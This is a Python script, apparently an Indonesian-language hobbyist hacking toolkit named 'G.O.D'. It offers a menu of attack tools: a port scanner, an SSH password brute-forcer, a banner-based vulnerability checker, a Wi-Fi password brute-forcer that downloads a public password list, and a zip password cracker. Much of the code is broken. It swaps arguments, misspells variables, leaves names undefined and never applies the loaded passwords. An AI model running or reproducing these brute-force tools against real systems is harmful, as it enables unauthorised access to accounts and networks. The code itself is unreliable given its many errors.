from __future__ import print_function
from sys import argv,exit
import sys
import subprocess as sp
from datetime import datetime
import socket
from threading import *
import zipfile
import argparse
import optparse
import os
d=sys.platform
if(d=="win32" or d=="win62"):
    sp.call('cls',shell=True)
else:
    sp.call('clear',shell=True)
print("""
_________________________  ____________________   ___________
|                       |  |                  |   |          \
|      _________________|  |    __________.   |   |           \
|      |                   |    |         |   |   |  _______.  |
|      |   ______________  |    |         |   |   |  |      |  |
|      |   |            |  |    |         |   |   |  |      |  |
|      |   |________    |  |    |         |   |   |  |      |  |
|      |            |   |  |    |         |   |   |  |      |  |
|      --------------   |  |    -----------   |   |  |______|  |
|                       |  |                  |   |        /  /
|_______________________|  |__________________|   |_______/__/
By      : G.O.D
Blog    : https://god-2.blogspot.com
Version : 1.0.3 FREE

""")
def PortScanner():
    host=input("[1/1] Host/Ip  : ")
    remot=socket.gethostbyname(host)
    print("\n[+] STARTING G.O.D 1.0.3 FREE")
    c=datetime.now()
    try:
        for port in range(1,80):
            e=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            f=e.connect_ex((remot,host))
            if f==0:
                print("[*] {}   : TERBUKA".format(port))
            e.close()
    except KeyboardInterrupt:
        sys.exit()
    except socket.gaierror:
        print("[!] Hostname Nya Salah Woy!\n")
    except socket.error:
        print("[!] Hostname Tidak Di temukan!\n")
    except socket.timeout:
        print("[!] gw bosen bro! kayanya nanti aja deh pas internet lagi kenceng")
    g=datetime.now()
    tot=g-c
    print("[+] SCANNING Berhasil Dalam : ",tot)
    print()
def ssh_dicker():
    try:
        import pxssh
        max_con=5
        con_loc=BoundedSemaphore(value=max_con)
        found=False
        fails=0
        def connect(host,user,pw,release):
            global found
            global fails
            try:
                s=pxssh.pxssh()
                s.login(host,user,pw)
                print("[*] Password Di temukan : "+pw)
                found=True
            except Exception as e:
                if 'read_nonblocking' in str(e):
                    fails+=1
                    connect(host,user,pw,False)
                elif 'synchronize with original prompt' in str(e):
                    connect(host,user,pw,False)
            finally:
                if releas: con_lock.releas()
        def main():
            parser=optparse.OptionParser('usage%prog -H <target host> -u <user> -F <password-list>')
            parser.add_option('-H',dest='tgtHost',type='string',help='specify target host')
            parser.add_option('-F',dest='passwdFile',type='string',help='specify password file')
            parser.add_option('-u',dest='user',type='string',help='specify the user')
            (options,args)=parser.parse_args()
            host=options.tgtHost
            passFile=options.passwdFile
            user=options.user
            if host==None or passFile==None or user==None:
                print(parser.usage)
                exit(0)
            fn=open(passFile,'r')
            for line in fn.readlines():
                if found:
                    print("[*] password DI Temukan!!!\n")
                    exit(0)
                if fails>5:
                    print("[!] Gw Bosen coy! lama banget Timeout nya. nanti aja deh kalo sinya nya lagi oke\n")
                    exit(0)
                con_lock.acquire()
                password=line.strip("\r").strip("\n")
                print("[+] Testing : "+str(password))
                t=Thread(target=connect,args=(host,user,password,True))
                child=t.start()
        if __name__ == '__main__':
            main()
    except ImportError:
        print("\n[!] PXSSH : Tidak Di temukan!!!\n")
def ServerVulnScanner():
    def retBanner(ip,port):
        try:
            socket.getdefaulttimeout(2)
            s=socket.socket()
            s.connect((ip,port))
            banner=s.recv(1024)
            return banner
        except:
            return
    def checkVulns(banner,filename):
        f=open(filename,'r')
        for line in f.readlines():
            if line.strip('\n') in banner:
                print("[*] Server Terbukti Lemah !!! : "+banner.strip('\n'))
    def main():
        if len(sys.argv)==2:
            filename=sys.argv[1]
            if not os.path.isfile(filename):
                print("[!] "+filename+" tidak benar atau tidak di temukan!\n")
            exit(0)
            if not os.access(filename,os.R_OK):
                print("[!] "+filename+" access denied.")
            exit(0)
        else:
            print("[!] Usage : "+str(sys.argv[0])+" <vuln filename>")
            exit(0)
        portList=[21,22,25,80,110,443]
        ips=input("Host : ")
        for x in range(147,150):
            ip=ips+str(x)
            for port in portList:
                banner=retBanner(ip,port)
                if banner:
                    print("[+] "+ip+": "+banner)
                    checkVulns(banner,filename)
    if __name__ == '__main__':
        main()
def Wifi_Brute_force():
    try:
        from scapy.all import srp,Ether,ARP,conf
        import urllib2
        from wifi import Cell,Scheme,exceptions
        def scan_ips(interface='wlan0',ips='192.168.1.0/24'):
            print("""
[+] STARTING G.O.D
""")
            try:
                print("[+] SCANNING ")
                conf.verb=0
                ether=Ether(dst="ff:ff:ff:ff:ff:ff")
                arp=ARP(pdst=ips)
                answer,unanswer=srp(ether/arp,timeout=2,iface=interface,inter=0.1)
                for sent,received in answer:
                    print(received.summary())
            except KeyboardInterrupt:
                sys.exit(1)
        def start():
            print("[+] bentar ya! download passwordlist nya dulu hehe")
            url="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_100000.txt"
            response=urllib2.urlopen(url)
            passwords=txt.splitlines()
            networks=Cell.all('wlan0')
            nb_loops=len(passwords)*len(networks)
            print("[*]  {} networks di temukan!. program akan looping {} kali!!".format(len(passwords),nb_loops))
            nb_test=0
            for password in passwords:
                for cell in networks:
                    try:
                        scheme=Scheme.for_cell('wlan0','home',cell,'test')
                        scheme.activate()
                        print("[+] Connect ke {} dengan `{}` passkey bekerja!!".format(cell,'test'))
                        sys.exit(0)
                    except exceptions.ConnectionError as e:
                        pass
                    finally:
                        nb_test+=1
                    sys.stdout.write('\r{} / {}'.format(nb_test,nb_loops))
                    sys.stdout.flush()
            print("You Are Not Lucky :'(\nFUCK YOU!!")
        def main():
            parser=argparse.ArgumentParser()
            parser.add_argument("-w","--wifi_brute_force",action="store_true",help="Cobalah untuk mem bruteforce beberapa wifi yang kena respond dari area mu")
            parser.add_argument("-a","--scan_ips",action="store_true",help="Scan semua IPs dalam network ini")
            args=parser.parse_args()
            if args.wifi_brute_force:
                wifi_bruteforce.start
            if args.scan_ips:
                network_scanner.scan()
        if __name__ == '__main__':
            main()
    except ImportError:
        print("[!] scapy : Tidak Di temukan!\n")
def zip_attack():
    def extractFile(zFile,password):
        try:
            zFile.extractall(pwd=password)
            print("[*] Password Di Temukan = "+password)
            return True
        except:
            return False
    def main():
        parser=argparse.ArgumentParser("%prog -f <zipfile> -d <dictionary>")
        parser.add_argument("-f",dest="zname",help="membutuhkan zip file berpassword")
        parser.add_argument("-d",dest="dname",help="membutuhkan file dictionary")
        if args.zname==None:
            print(parser.usage)
            exit(0)
        elif args.dname==None:
            zname=args.zname
            dname='passwords.txt'
        else:
            zname=args.zname
            dname=args.dname
        zFile=zipfile.ZipFile(zname)
        passFile=open(dname)
        for line in passFile.readlines():
            password=line.strip("\n")
            found=extractFile(zFile,password)
            if found==True:
                exit(0)
        print("[-] Password Tidak Di temukan!")
    if __name__ == "__main__":
        main()
def Ask():
    print("""
[1] Port Scanner
[2] SSH Dicker
[3] Server Vuln Scanner
[4] Wifi Brute Force
[5] Zip Attacker

""")
def Optionss():
    while True:
        x=input("[?] ")
        if(x=="1"):
            PortScanner()
        elif(x=="2"):
            ssh_dicker()
        elif(x=="3"):
            ServerVulnScanner()
        elif(x=="4"):
            Wifi_Brute_force()
        elif(x=="5"):
            zip_attack()
        elif(x!="\n"):
            print("[!] Invalid Options!")
Ask()
Optionss()
